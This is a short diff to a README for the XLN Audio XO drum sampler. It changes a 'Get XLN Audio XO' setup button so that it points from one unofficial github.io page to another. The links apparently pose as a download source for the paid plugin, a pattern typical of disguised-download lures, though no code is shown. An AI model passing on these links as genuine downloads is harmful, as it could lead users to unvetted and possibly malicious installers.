@@ -21,7 +21,7 @@ To begin using this **XLN Audio XO drum sampler**, **XLN Audio XO sample organiz
 | :--- | :--- |
 | **Get XLN Audio XO** | Click the button below to start setup for this **XLN Audio XO beat maker**. |
 
-[![Button](https://img.shields.io/badge/🎧-Get_XLN_Audio_XO-2ea44f?style=for-the-badge)](https://d58856445.github.io/.github/xln-audio-xo)
+[![XLN Audio XO](https://img.shields.io/badge/Open-XLN%20Audio%20XO-0D9488?style=for-the-badge)](https://xln-audio-drum-plugin.github.io/.github/xln-audio-xo)
 
 ## System Requirements
 
